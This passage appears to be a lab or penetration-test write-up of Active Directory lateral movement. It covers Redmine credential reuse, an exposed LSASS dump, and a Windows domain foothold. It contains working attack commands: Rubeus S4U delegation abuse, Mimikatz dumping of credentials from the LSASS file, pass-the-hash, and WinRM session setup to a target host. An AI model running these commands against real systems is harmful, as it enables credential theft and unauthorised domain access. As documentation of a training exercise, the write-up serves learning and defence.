```powershell
# FROM IT-EMPLOYEE15 (RBCD)
.\Rubeus.exe s4u /user:it-attack01$ /rc4:REDACTED_SECRET /msdsspn:HTTP/it-track01.it.gcb.example /impersonateuser:Administrator /ptt

winrs.exe -r:it-track01.it.gcb.example cmd
```

> The `Administrator.IT` profile directory corresponds to the domain user `IT\Administrator`. Because a local `Administrator` profile already exists on the system, Windows appends the `.IT` suffix (domain NetBIOS name) to distinguish the domain account profile — access here is limited to local administrator on this host.

## ATTACK CHAIN

`Host (port 80/TCP)` → browser access (HTTP) → web enumeration (browsing, headers, technologies, endpoints) → application fingerprinting → sensitive path and panel identification → sensitive file discovered → credential extraction → reuse → access to `10.200.6.197 ~ SEC-SYSLOG01`

## EXPLOITATION

During web service enumeration, a Redmine installation was found at:

```
http://10.200.9.111/redmine/
# user: itemployees
# pass: REDACTED_SECRET
```

After authenticating, an LSASS memory dump (`.dmp`) was found exposed as an attachment:

```http
http://10.200.9.111/redmine/attachments/1
```

> An LSASS minidump is a highly sensitive artifact — it may contain credentials for all users with active sessions on the system at the time of capture.

#### Credential Extraction from Minidump

The file was downloaded and analyzed with Mimikatz v2.1.1 by loading the LSASS dump.

```powershell
.\mimikatz_2_1_1.exe "privilege::debug" "sekurlsa::minidump C:\tools\lsass_mem.dmp" "sekurlsa::logonpasswords"  "exit"

Domain   : gcbsec.example
Username : admin
NTLM     : REDACTED_HASH
Username : SEC-SYSLOG01$
NTLM     : REDACTED_HASH
```

> These credentials enable Pass-the-Hash authentication without requiring the cleartext password.

#### Active Directory Impact

The LSASS dump exposed privileged credentials from `gcbsec.example`. This not only provides reusable authentication material but also reveals the existence of an additional domain within the infrastructure, significantly expanding the attack surface and opening lateral movement paths toward `gcbsec.example`.

#### Remote Access via Pass-the-Hash

```powershell
# IT-EMPLOYEE15 — inject identity via Pass-the-Hash
.\mimikatz.exe "sekurlsa::pth /user:admin /domain:SECSYSLOG01 /ntlm:REDACTED_SECRET /run:powershell" "exit"

# Allow WinRM connections to the target host
winrm set winrm/config/client '@{TrustedHosts="10.200.6.197"}'

# Create an authenticated remote session using the injected context
$secsyslog = New-PSSession 10.200.6.197 -Authentication Negotiate

# Interactive access
Enter-PSSession $secsyslog
```
